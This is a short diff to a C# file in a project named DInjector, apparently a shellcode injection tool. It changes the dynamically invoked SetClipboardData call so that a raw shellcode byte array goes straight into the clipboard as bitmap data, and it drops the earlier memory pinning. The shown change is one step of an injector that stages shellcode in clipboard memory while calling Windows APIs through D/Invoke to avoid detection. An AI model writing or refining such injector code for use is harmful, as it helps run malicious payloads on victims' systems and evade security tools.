@@ -15,7 +15,7 @@ namespace DInjector
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate IntPtr SetClipboardData(
             uint uFormat,
-            IntPtr hMem);
+            byte[] hMem);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         delegate bool CloseClipboard();
@@ -39,7 +39,7 @@ namespace DInjector
             return result;
         }
 
-        public static IntPtr setClipboardData(uint uFormat, IntPtr hMem)
+        public static IntPtr setClipboardData(uint uFormat, byte[] hMem)
         {
             object[] parameters = { uFormat, hMem };
             var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "SetClipboardData", typeof(SetClipboardData), ref parameters);
@@ -62,14 +62,11 @@ namespace DInjector
             #region SetClipboardData
 
             openClipboard(IntPtr.Zero);
-            GCHandle shellcodeArray = GCHandle.Alloc(shellcode, GCHandleType.Pinned);
-            IntPtr shellcodePointer = shellcodeArray.AddrOfPinnedObject();
 
             IntPtr clipboardData = setClipboardData(
                 0x2, // CF_BITMAP
-                shellcodePointer);
+                shellcode);
 
-            //shellcodeArray.Free();
             closeClipboard();
 
             #endregion
